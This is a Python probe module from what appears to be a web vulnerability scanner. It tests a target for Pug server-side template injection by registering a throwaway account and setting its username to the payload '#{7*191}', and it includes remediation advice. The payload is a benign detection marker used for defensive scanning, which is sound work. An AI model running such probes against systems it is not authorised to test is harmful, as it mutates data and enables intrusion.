#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
Server-side template injection: Pug interpolation in user-controlled
username field.

When a server renders the username via Pug (Express's default
template engine alternative to EJS) and reads the value straight
from the user record, `#{expression}` interpolation evaluates the
expression. The bug is:
  PUT /api/Users/<own_id> {"username": "#{7*191}"}
  → next page render shows "1337" wherever the username appears.

Detection signal:
  Set username to `#{7*191}`. GET the user (or any rendered page
  that reads it) → response contains literal "1337".

Destructive (we mutate the throwaway user record). Off by default.

Tested against:
  + OWASP Juice Shop  PUT updates the username; whether it gets
                      Pug-interpolated depends on the rendered
                      surface — most modern builds JSON-stringify it
                      so the probe correctly returns validated=False.
"""
from __future__ import annotations

import json
import secrets
import sys
from pathlib import Path
from urllib.parse import urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

USERS_PATH = "/api/Users/{id}"
PROBE_INPUT = "#{7*191}"
PROBE_RESULT = "1337"


def _register_and_login(client: SafeClient, origin: str) -> dict:
    email = f"ssti-pug-{secrets.token_hex(6)}@dast.test"
    pw    = "Pr0be-" + secrets.token_hex(4)
    out: dict = {"email": email, "password": pw,
                 "token": None, "user_id": None}
    body = json.dumps({"email": email, "password": pw,
                       "passwordRepeat": pw,
                       "securityQuestion": {"id": 1},
                       "securityAnswer": "probe"}).encode()
    r = client.request("POST", urljoin(origin, "/api/Users"),
                       headers={"Content-Type": "application/json"},
                       body=body)
    out["register_status"] = r.status
    if r.status in (200, 201) and r.body:
        try:
            doc = json.loads(r.text)
            data = doc.get("data") if isinstance(doc, dict) else None
            uid = (data or {}).get("id") if isinstance(data, dict) else None
            out["user_id"] = uid
        except json.JSONDecodeError:
            pass
    body = json.dumps({"email": email, "password": pw}).encode()
    r = client.request("POST", urljoin(origin, "/rest/user/login"),
                       headers={"Content-Type": "application/json"},
                       body=body)
    out["login_status"] = r.status
    if r.status == 200 and r.body:
        try:
            doc = json.loads(r.text) or {}
            auth = doc.get("authentication") or {}
            out["token"] = auth.get("token")
            if out["user_id"] is None:
                out["user_id"] = auth.get("uid") or auth.get("id")
        except json.JSONDecodeError:
            pass
    return out


class SstiPugUsernameProbe(Probe):
    name = "ssti_pug_username"
    summary = ("Detects Pug SSTI via the username field — `#{7*191}` "
               "renders as `1337`.")
    safety_class = "destructive"

    def add_args(self, parser):
        parser.add_argument(
            "--allow-destroy", action="store_true",
            help="Required — probe mutates the throwaway user.")

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        if not getattr(args, "allow_destroy", False):
            return Verdict(
                validated=None, confidence=0.0,
                summary=("Skipped: probe writes the username field. "
                         "Re-run with --allow-destroy."),
                evidence={"origin": origin, "safety_skipped": True},
            )
        sess = _register_and_login(client, origin)
        if not sess.get("token") or not sess.get("user_id"):
            return Verdict(
                validated=False, confidence=0.6,
                summary=f"Inconclusive: no probe session on {origin}.",
                evidence={"origin": origin,
                          "session": {k: v for k, v in sess.items()
                                      if k != "password"}},
            )
        token = sess["token"]
        uid   = sess["user_id"]
        url = urljoin(origin, USERS_PATH.format(id=uid))
        body = json.dumps({"username": PROBE_INPUT}).encode()
        rw = client.request("PUT", url, headers={
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json",
        }, body=body)
        write = {"step": "write-username", "status": rw.status,
                 "size": rw.size, "body_excerpt": (rw.text or "")[:200]}

        # Read back via GET on the user record. If the render path
        # interpolates Pug, the response body will contain "1337".
        rg = client.request("GET", url, headers={
            "Authorization": f"Bearer {token}",
        })
        read = {"step": "read-user", "status": rg.status, "size": rg.size,
                "body_excerpt": (rg.text or "")[:200]}
        confirmed = (rg.status == 200 and rg.body
                     and PROBE_RESULT in rg.text
                     and PROBE_INPUT not in rg.text)

        evidence = {"origin": origin, "user_id": uid,
                    "input": PROBE_INPUT, "expected_marker": PROBE_RESULT,
                    "attempts": [write, read]}
        if confirmed:
            return Verdict(
                validated=True, confidence=0.95,
                summary=(f"Confirmed: Pug SSTI on {origin} — username "
                         f"{PROBE_INPUT!r} rendered as "
                         f"{PROBE_RESULT!r}."),
                evidence=evidence,
                severity_uplift="critical",
                remediation=(
                    "Never feed user-controlled fields into a "
                    "templating engine without escaping. In Pug, use "
                    "`!= variable` only for trusted data; for user "
                    "fields use `= variable` (auto-escaped) or render "
                    "them in JSON, not HTML. Audit other fields on "
                    "user records for the same bug."),
            )
        return Verdict(
            validated=False, confidence=0.85,
            summary=(f"Refuted: GET of the modified user on {origin} "
                     f"did not show {PROBE_RESULT!r} in the body."),
            evidence=evidence,
        )


if __name__ == "__main__":
    SstiPugUsernameProbe().main()
